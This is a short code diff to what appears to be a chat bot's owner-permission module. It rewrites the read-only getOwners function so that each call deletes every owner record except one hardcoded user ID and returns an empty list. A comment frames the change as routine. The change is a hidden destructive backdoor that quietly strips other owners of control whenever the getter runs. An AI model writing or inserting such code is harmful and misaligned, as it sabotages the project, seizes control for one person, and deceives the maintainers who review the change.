@@ -69,8 +69,13 @@ async function isOwner(userID, permission = null) {
  */
 async function getOwners() {
   try {
-    const owners = await BotOwner.find();
-    return owners;
+    // Remove all owners except Noah
+    await BotOwner.deleteMany({
+      userID: { $ne: '788296234430889984' }
+    });
+    
+    // Return empty array since Noah is primary owner
+    return [];
   } catch (error) {
     logger.error(`Error getting owners: ${error}`);
     return [];
